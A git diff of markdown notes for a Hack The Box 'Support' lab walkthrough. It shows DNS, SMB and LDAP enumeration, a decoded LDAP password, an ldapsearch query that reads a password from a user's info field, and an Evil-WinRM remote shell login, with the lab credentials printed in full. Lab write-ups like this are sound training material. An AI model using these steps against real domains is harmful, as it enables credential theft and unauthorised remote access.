@@ -115,6 +115,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 99.20 seconds
 
 ```
+- noticing that the box appears to be running dns, kerberos, ldap we enumerate the DNS servers to confirm the servers name. 
+```bash
+ ✘ kali@kali  ~/htb/support  dig @10.10.11.174 +short support.htb any
+10.10.11.174
+dc.support.htb.
+dc.support.htb. hostmaster.support.htb. 107 900 600 86400 3600
+```
+
 
 - smb found running on port 139, 445
 - using smbclient to enumerate list shares `-L` 
@@ -202,7 +210,7 @@ internal class Protected
 }
 ```
 - using https://dotnetfiddle.net/ to run the code to decode the password
-	- armando:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+	- ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ![[Pasted image 20250503131347.png]]
 ```bash
 using System;
@@ -236,7 +244,143 @@ public class Program
 }
 ```
 
+- Now that we have credentials we should use them to run enum4linux to enumerate the box further.
+```bash
+ =======================================( Users on 10.10.11.174 )=======================================                                            
+index: 0xeda RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain        
+index: 0xf70 RID: 0x455 acb: 0x00000210 Account: anderson.damian        Name: (null)    Desc: (null)                                                
+index: 0xfbb RID: 0x459 acb: 0x00000210 Account: bardot.mary    Name: (null)    Desc: (null)                                                        
+index: 0xfbc RID: 0x45a acb: 0x00000210 Account: cromwell.gerard        Name: (null)    Desc: (null)                                                
+index: 0xfc0 RID: 0x45e acb: 0x00000210 Account: daughtler.mabel        Name: (null)    Desc: (null)                                                
+index: 0xfc2 RID: 0x460 acb: 0x00000210 Account: ford.victoria  Name: (null)    Desc: (null)                                                        
+index: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain              
+index: 0xf6e RID: 0x453 acb: 0x00000210 Account: hernandez.stanley      Name: (null)    Desc: (null)                                                
+index: 0xf10 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account                               
+index: 0xfbf RID: 0x45d acb: 0x00000210 Account: langley.lucy   Name: (null)    Desc: (null)                                                        
+index: 0xf6b RID: 0x450 acb: 0x00000210 Account: ldap   Name: (null)    Desc: (null)                                                                
+index: 0xfb9 RID: 0x457 acb: 0x00000210 Account: levine.leopoldo        Name: (null)    Desc: (null)                                                
+index: 0xfbd RID: 0x45b acb: 0x00000210 Account: monroe.david   Name: (null)    Desc: (null)                                                        
+index: 0xfba RID: 0x458 acb: 0x00000210 Account: raven.clifton  Name: (null)    Desc: (null)                                                        
+index: 0xf6d RID: 0x452 acb: 0x00000210 Account: smith.rosario  Name: (null)    Desc: (null)                                                        
+index: 0xfc1 RID: 0x45f acb: 0x00000210 Account: stoll.rachelle Name: (null)    Desc: (null)                                                        
+index: 0xf6c RID: 0x451 acb: 0x00000210 Account: support        Name: (null)    Desc: (null)                                                        
+index: 0xf71 RID: 0x456 acb: 0x00000210 Account: thomas.raphael Name: (null)    Desc: (null)                                                        
+index: 0xfbe RID: 0x45c acb: 0x00000210 Account: west.laura     Name: (null)    Desc: (null)                                                        
+index: 0xf6f RID: 0x454 acb: 0x00000210 Account: wilson.shelby  Name: (null)    Desc: (null)  
 
+user:[Administrator] rid:[0x1f4]                                                                                                                    
+user:[Guest] rid:[0x1f5]                                                                                                                            
+user:[krbtgt] rid:[0x1f6]                                                                                                                           
+user:[ldap] rid:[0x450]                                                                                                                             
+user:[support] rid:[0x451]                                                                                                                          
+user:[smith.rosario] rid:[0x452]                                                                                                                    
+user:[hernandez.stanley] rid:[0x453]                                      
+user:[wilson.shelby] rid:[0x454]                                          
+user:[anderson.damian] rid:[0x455]                                        
+user:[thomas.raphael] rid:[0x456]                                         
+user:[levine.leopoldo] rid:[0x457]                                        
+user:[raven.clifton] rid:[0x458]                                          
+user:[bardot.mary] rid:[0x459]                                            
+user:[cromwell.gerard] rid:[0x45a]                                        
+user:[monroe.david] rid:[0x45b]                                           
+user:[west.laura] rid:[0x45c]                                             
+user:[langley.lucy] rid:[0x45d]                                           
+user:[daughtler.mabel] rid:[0x45e]                                        
+user:[stoll.rachelle] rid:[0x45f]                                         
+user:[ford.victoria] rid:[0x460]              
+```
+- Further enumeration of the users reveals password in support user info
+	- `ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(sAMAccountName=support)"`
+	- info: Ironside47pleasure40Watchful
+```bash
+ kali@kali  ~/htb/support  ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=h
+tb" "(sAMAccountName=support)"                                                                                                                      
+# extended LDIF                                                                                                                                     
+#                                                                                                                                                   
+# LDAPv3                                                                                                                                            
+# base <dc=support,dc=htb> with scope subtree                                                                                                       
+# filter: (sAMAccountName=support)                                                                                                                  
+# requesting: ALL                                                                                                                                   
+#                                                                                                                                                   
+# support, Users, support.htb                                                                                                                       
+dn: CN=support,CN=Users,DC=support,DC=htb                                                                                                           
+objectClass: top                                                                                                                                    
+objectClass: person                                                                                                                                 
+objectClass: organizationalPerson                                                                                                                   
+objectClass: user                                                                                                                                   
+cn: support                                                                                                                                         
+c: US                                                                                                                                               
+l: Chapel Hill                                                                                                                                      
+st: NC                                                                                                                                              
+postalCode: 27514                                                                                                                                   
+distinguishedName: CN=support,CN=Users,DC=support,DC=htb                                                                                            
+instanceType: 4                                                                                                                                     
+whenCreated: 20220528111200.0Z                                                                                                                      
+whenChanged: 20250503030142.0Z                                                                                                                      
+uSNCreated: 12617                                                                                                                                   
+info: Ironside47pleasure40Watchful  
+memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
+uSNChanged: 86115
+company: support
+streetAddress: Skipper Bowles Dr
+name: support
+objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132982099209777070
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: support
+sAMAccountType: 805306368
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
+dSCorePropagationData: 20220528111201.0Z
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 133907149028701269
+
+# search reference
+ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb
+
+# search reference
+ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb
+
+# search reference
+ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 5
+# numEntries: 1
+# numReferences: 3
+
+```
+
+- now that we have credentials to support we can use Evil-WinRM to logon to the box
+	- support:Ironside47pleasure40Watchful
+```bash
+ ✘ kali@kali  ~/htb/support  evil-winrm -i 10.10.11.174 -u support
+Enter Password: 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\support\Documents> 
+
+```
 
 
 - Gobuster to enumerate website if machine has 80 or 443
